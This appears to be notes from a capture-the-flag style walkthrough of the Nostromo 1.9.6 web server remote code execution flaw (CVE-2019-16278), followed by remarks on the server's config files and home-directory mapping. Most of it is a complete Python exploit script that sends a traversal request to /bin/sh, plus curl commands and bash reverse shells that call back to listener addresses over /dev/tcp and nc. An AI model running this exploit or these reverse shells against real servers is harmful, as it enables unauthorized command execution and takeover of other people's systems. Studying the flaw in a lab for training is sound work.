_____

nostromo 1.9.6 - Remote Code Execution

CVE-2019-16278

https://github.com/aN0mad/CVE-2019-16278-Nostromo_1.9.6-RCE


```bash
import argparse
import socket

# Setup Argparse
parser = argparse.ArgumentParser(description="Exploit for CVE-2019-16278 - Nostromo 1.9.6 RCE")
parser.add_argument("-t", "--target", help="Remote host to target")
parser.add_argument("-p", "--port", help="Remote port to target")
parser.add_argument("-c", "--command", help="Command to execute on the server")
parser.add_argument("-b", "--bytes", help="The number of bytes to receive back in the response")

# Define and assign the variables
args = parser.parse_args()
TARGET = args.target
PORT = int(args.port)
COMMAND = args.command
BYTES = args.bytes
URL = "/.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0"

# Check if the number of return bytes was passed in
if BYTES is None:
    BYTES = 4096
else:
    BYTES = int(BYTES)

# Build the payload
payload = URL + "\r\n"
payload += "Content-Length: 1\r\n\r\n"
payload += "echo\necho\n" + COMMAND + " 2>&1"

# Create the socket and send the payload
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET, PORT))
s.send("POST ".encode() + payload.encode())  # Encode the entire string to bytes before sending

# Receive the response and close the socket
print(s.recv(1024))
print(s.recv(BYTES))
s.close()
```

```bash
python3 test.py -t 10.10.10.165 -p 80 -c 'whoami'
```

```bash
python3 test.py -t 10.10.10.165 -p 80 -c "bash -c 'bash -i >& /dev/tcp/10.10.14.21/443 0>&1'"
```

### Exploit POC

I’ll start playing around with `curl` and see if I can get it to work. I’ll start with the following command: `curl -s -X POST 'http://10.10.10.165/.%0d./.%0d./.%0d./bin/sh' -d "id | nc 10.10.14.6 443"`. The options are:

- `-s` - silence the progress bar and error messages
- `-X POST` - send a POST request
- `http://10.10.10.165/.%0d./.%0d./.%0d./bin/sh` - The target, with the directory traversal to access `/bin/sh`
- `-d "id | nc 10.10.14.6 443"` - The command I want to run, which will send the results of `id` back to a listener on my box port 443.

```bash
curl -s -X POST 'http://10.10.10.165/.%0d./.%0d./.%0d./bin/sh' -d '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.6/443 0>&1"'
```

# Conf files

```
/var/nostromo/conf/.htpasswd
```

```
/var/nostromo/conf/nhttpd.conf
```

```
# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```

So `/homedirs /home` points `nostromo` to the home directories, and then in a users directory, the webroot will be `public_www`. So `http://10.10.10.165/~david` will be `/home/david/public_www`.
